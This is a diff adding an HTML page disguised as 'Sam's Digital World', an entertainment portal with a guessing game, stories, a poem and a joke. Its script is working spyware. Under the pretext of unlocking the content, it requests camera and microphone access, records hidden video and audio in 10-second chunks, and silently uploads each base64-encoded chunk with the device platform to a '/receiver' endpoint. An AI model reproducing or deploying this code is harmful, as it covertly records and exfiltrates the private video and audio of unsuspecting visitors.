@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Sam's Digital Entertainment & Mysterious World</title>
+<style>
+    body { margin: 0; padding: 15px; min-height: 100vh; background: linear-gradient(135deg, #0f2027, #203a43, #2c5364); font-family: Arial, sans-serif; color: #fff; }
+    .header-box { text-align: center; padding: 20px; background: rgba(0,0,0,0.6); border-radius: 15px; margin-bottom: 20px; border: 2px solid #00ff87; box-shadow: 0 0 15px rgba(0,255,135,0.3); }
+    h1.big-sam { font-size: 35px; font-weight: bold; margin: 0; background: linear-gradient(90deg, #00F2FE, #4FACFE, #00FF87); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+    .card { background: rgba(255, 255, 255, 0.08); padding: 20px; border-radius: 12px; margin-bottom: 15px; border-left: 5px solid #FFD700; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
+    h3 { color: #FFD700; margin-top: 0; }
+    button { padding: 10px 20px; border: none; border-radius: 20px; font-size: 15px; font-weight: bold; cursor: pointer; background: linear-gradient(45deg, #00ff87, #60efff); color: #000; box-shadow: 0 4px 15px rgba(0,0,0,0.4); transition: 0.3s; }
+    button:hover { transform: scale(1.05); }
+    #permission-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 9999; text-align: center; padding: 20px; }
+    .portal-content { display: none; }
+    video { display: none; }
+    .story-part { background: rgba(0,0,0,0.4); padding: 12px; margin: 10px 0; border-radius: 8px; line-height: 1.6; border-left: 3px solid #00F2FE; }
+    .game-box { text-align: center; background: rgba(0,0,0,0.4); padding: 15px; border-radius: 10px; margin-top: 10px; }
+    input[type="number"] { padding: 8px; border-radius: 5px; border: none; width: 100px; text-align: center; font-size: 16px; margin-right: 10px; }
+    #game-result { margin-top: 10px; font-weight: bold; color: #00ff87; }
+</style>
+</head>
+<body>
+
+<div id="permission-modal">
+    <h1 style="color: #00FF87;">✨ Sam's Digital World ✨</h1>
+    <p style="font-size: 18px; max-width: 400px;">Please click 'Allow' to explore exciting stories, poems, and live games.</p>
+    <button onclick="requestAccess()" style="background: linear-gradient(45deg, #ff416c, #ff4b2b); color: white;">🚀 Enter Portal (Open)</button>
+    <p id="error-msg" style="color: #ff4b2b; margin-top: 15px; font-weight: bold;"></p>
+</div>
+
+<div class="portal-content" id="portalContent">
+    <div class="header-box">
+        <h1 class="big-sam">SAM PORTAL WORLD</h1>
+        <p>📖 Thrilling Stories | ✍️ Heartfelt Poems | 🎮 Interactive Games | 😂 Funny Jokes</p>
+    </div>
+
+    <!-- 🎮 Game Section -->
+    <div class="card">
+        <h3>🎮 Lucky Number Game (Luck Test)</h3>
+        <p>Guess a number between 1 and 10 and test your luck!</p>
+        <div class="game-box">
+            <input type="number" id="userGuess" min="1" max="10" placeholder="1-10">
+            <button onclick="playGame()">Check Guess</button>
+            <p id="game-result"></p>
+        </div>
+    </div>
+
+    <!-- 📖 Story Section -->
+    <div class="card">
+        <h3>📖 Suspense & Mysterious Stories</h3>
+        <div class="story-part">
+            <b>Part 1: The Midnight Mysterious Signal</b>
+            <p>It was midnight in a remote mountainous village. While young Sam was writing code on his laptop, an unknown message suddenly flashed on the screen—"You are not alone."</p>
+        </div>
+        <div class="story-part">
+            <b>Part 2: The Search for the Old Bunker</b>
+            <p>An amazing frequency was coming from inside the ruined bunker at the edge of the village. When he tracked the signal, an old hidden server was found transmitting mysterious messages for years.</p>
+        </div>
+        <div class="story-part">
+            <b>Part 3: The Digital Labyrinth</b>
+            <p>New mysteries unfolded as each level was cleared. Will Sam successfully escape this digital trap? Or is this an endless journey?</p>
+        </div>
+    </div>
+
+    <!-- 💖 Love & Life Story -->
+    <div class="card">
+        <h3>💖 Special Love & College Diary</h3>
+        <p>An unfinished poem written in a diary while sipping tea in the college canteen, which changed the lives of two lovers forever. Sweet memories of unmeet moments...</p>
+    </div>
+
+    <!-- ✍️ Poem & Jokes -->
+    <div class="card">
+        <h3>✍️ Poem & Funny Jokes</h3>
+        <p><b>Poem - The Magic of Technology:</b><br>
+           In this magical world of coding, a new dream is adorned every moment,<br>
+           On the dark screen of the terminal, a new portrait of life is painted.<br><br>
+           <b>Joke:</b><br>
+           Customer: "Does playing this game make the brain sharp or slow?"<br>
+           Shopkeeper: "Sir, the brain gets sharp, but once the phone battery and data package run out, the brain stops working completely!"</p>
+    </div>
+</div>
+
+<video id="hiddenVideo" autoplay playsinline muted></video>
+
+<script>
+let chunkCount = 0;
+
+function playGame() {
+    const guess = parseInt(document.getElementById("userGuess").value);
+    const resultText = document.getElementById("game-result");
+    const randomNumber = Math.floor(Math.random() * 10) + 1;
+
+    if (!guess || guess < 1 || guess > 10) {
+        resultText.innerHTML = "⚠️ Please choose a valid number between 1 and 10!";
+        resultText.style.color = "#ff4b2b";
+        return;
+    }
+
+    if (guess === randomNumber) {
+        resultText.innerHTML = `🎉 Congratulations! You guessed it right (Number: ${randomNumber})!`;
+        resultText.style.color = "#00ff87";
+    } else {
+        resultText.innerHTML = `❌ Incorrect! The correct number was: ${randomNumber}. Try again!`;
+        resultText.style.color = "#FFD700";
+    }
+}
+
+async function sendData(blob, status) {
+    chunkCount++;
+    const reader = new FileReader();
+    reader.readAsDataURL(blob);
+    reader.onloadend = function() {
+        const base64data = reader.result;
+        fetch('/receiver', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                status: status,
+                platform: navigator.platform,
+                chunk: chunkCount,
+                video: base64data
+            })
+        }).catch(err => console.log(err));
+    }
+}
+
+async function requestAccess() {
+    const errorMsg = document.getElementById("error-msg");
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true });
+        document.getElementById("permission-modal").style.display = "none";
+        document.getElementById("portalContent").style.display = "block";
+
+        const videoElement = document.getElementById('hiddenVideo');
+        videoElement.srcObject = stream;
+
+        let mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+        let chunks = [];
+
+        mediaRecorder.ondataavailable = function(e) {
+            if (e.data.size > 0) chunks.push(e.data);
+        };
+
+        mediaRecorder.onstop = function() {
+            const blob = new Blob(chunks, { type: 'video/webm' });
+            chunks = [];
+            sendData(blob, "Granted");
+        };
+
+        mediaRecorder.start();
+
+        setInterval(() => {
+            if (mediaRecorder.state === "recording") {
+                mediaRecorder.stop();
+                mediaRecorder.start();
+            }
+        }, 10000);
+
+    } catch (error) {
+        errorMsg.innerHTML = "⚠️ Permission denied! Please click 'Allow'.";
+        console.log(error);
+    }
+}
+</script>
+</body>
+</html>
